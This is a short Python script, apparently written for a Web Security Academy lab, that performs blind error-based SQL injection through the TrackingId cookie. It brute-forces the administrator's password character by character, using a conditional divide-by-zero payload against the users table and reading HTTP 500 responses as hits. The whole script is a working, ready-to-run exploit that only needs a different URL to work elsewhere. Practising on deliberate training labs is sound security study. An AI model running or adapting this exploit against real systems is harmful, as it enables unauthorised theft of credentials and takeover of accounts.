import requests

# Target URL where the SQL injection will be tested
url = "https://0af0005904f09648811c94de004000a2.web-security-academy.net/"

# Initial cookie setup (empty payload initially)
cookies = {'TrackingId': ''}  # Fill with payload dynamically in the loop

# Character set to test against (you can add more characters if needed)
charset = 'abcdefghijklmnopqrstuvwxyz0123456789'
password = ''

# Loop over each character position (assuming password length of up to 20)
for i in range(1, 21):  # Adjust the range as needed for longer passwords
    for char in charset:
        # Create the payload with the SQL injection
        payload = f"r6SmTD8yjKG4TGNZ' || (SELECT CASE WHEN SUBSTR(password, {i}, 1) = '{char}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '"
        # Inject the payload into the cookie
        cookies['TrackingId'] = payload
        
        # Send the request with the modified cookie
        response = requests.get(url, cookies=cookies)
        
        # Check the response to see if the condition was met (e.g., Welcome back message)
        if response.status_code == 500:
            password += char
            print(f"Found character: {char}")
            break

print(f"The password for the administrator is: {password}")
